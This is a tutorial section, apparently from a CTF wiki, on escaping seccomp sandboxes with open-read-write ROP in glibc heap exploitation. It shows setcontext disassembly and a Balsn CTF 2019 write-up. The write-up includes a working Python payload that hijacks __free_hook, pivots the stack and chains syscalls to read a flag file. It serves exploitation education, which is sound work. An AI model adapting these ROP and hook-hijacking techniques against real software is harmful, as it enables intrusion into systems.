# C Sandbox Escape
## orw

Sometimes, to increase difficulty, pwn challenges use functions like [seccomp](https://en.wikipedia.org/wiki/Seccomp) to disable some system calls. They often disable system calls like execve, making it essentially impossible to get a shell. However, since pwn challenges are flag-oriented, we can still read the flag through the orw (open-read-write) method. Stack-based orw is not significantly different from regular ROP. Here we mainly discuss whitelist bypass in heap exploitation.

Generally speaking, for heap exploitation challenges with whitelisting enabled, after hijacking a hook function such as __free_hook or the GOT table, we consider implementing orw. At this point, we can only inject a single gadget. Typically, we want this gadget to achieve stack pivoting. A relatively common approach is to use the setcontext function, which in libc-2.29 is implemented as:

```
.text:0000000000055E00 ; __unwind {
.text:0000000000055E00                 push    rdi
.text:0000000000055E01                 lea     rsi, [rdi+128h] ; nset
.text:0000000000055E08                 xor     edx, edx        ; oset
.text:0000000000055E0A                 mov     edi, 2          ; how
.text:0000000000055E0F                 mov     r10d, 8         ; sigsetsize
.text:0000000000055E15                 mov     eax, 0Eh
.text:0000000000055E1A                 syscall                 ; LINUX - sys_rt_sigprocmask
.text:0000000000055E1C                 pop     rdx
.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000055E23                 jnb     short loc_55E80
.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
.text:0000000000055E2C                 fldenv  byte ptr [rcx]
.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
.text:0000000000055E3C                 mov     rbx, [rdx+80h]
.text:0000000000055E43                 mov     rbp, [rdx+78h]
.text:0000000000055E47                 mov     r12, [rdx+48h]
.text:0000000000055E4B                 mov     r13, [rdx+50h]
.text:0000000000055E4F                 mov     r14, [rdx+58h]
.text:0000000000055E53                 mov     r15, [rdx+60h]
.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
.text:0000000000055E5E                 push    rcx
.text:0000000000055E5F                 mov     rsi, [rdx+70h]
.text:0000000000055E63                 mov     rdi, [rdx+68h]
.text:0000000000055E67                 mov     rcx, [rdx+98h]
.text:0000000000055E6E                 mov     r8, [rdx+28h]
.text:0000000000055E72                 mov     r9, [rdx+30h]
.text:0000000000055E76                 mov     rdx, [rdx+88h]
.text:0000000000055E76 ; } // starts at 55E00
```

Other versions are largely similar. As we can see, this function assigns a value to rsp. If we can control rdx, we can control rsp to achieve stack pivoting.

### Example
#### Balsn_CTF_2019-PlainText
##### Analysis
The exploitation before orw will not be discussed here. Please refer to the analysis of this challenge in "Off-By-One in Heap" under the "Glibc Heap Exploitation" section.

The annoying part is that under libc-2.29, the free function no longer assigns rdi to rdx, so we cannot directly control rdx — we can only control rdi. Fortunately, there happens to be a gadget in this challenge's libc:

```
0x12be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;
```

By using this gadget to modify rdx and then returning to setcontext, we can proceed with ROP (this chunk cannot be found through ROPgadget and requires ropper instead).
##### Exploit
Only the payload is provided here
```python
## alloc to __free_hook ##
magic_gadget = libc_base + 0x12be97
add(0x28,p64(magic_gadget)) # 73

pop_rdi_ret = libc_base + 0x26542
pop_rsi_ret = libc_base + 0x26f9e
pop_rdx_ret = libc_base + 0x12bda6
syscall_ret = libc_base + 0xcf6c5
pop_rax_ret = libc_base + 0x47cf8
ret = libc_base + 0xc18ff

payload_addr = heap_base + 0x270
str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
rw_addr = heap_base 

payload = p64(libc_base + 0x55E35) # rax
payload += p64(payload_addr - 0xA0 + 0x10) # rdx
payload += p64(payload_addr + 0x28)
payload += p64(ret)
payload += ''.ljust(0x8,'\x00')

rop_chain = ''
rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["read"])
rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["write"])

payload += rop_chain
payload += './flag\x00'
add(len(payload) + 0x10,payload) # 74
#gdb.attach(proc.pidof(sh)[0])
delete(74)

sh.interactive()
```
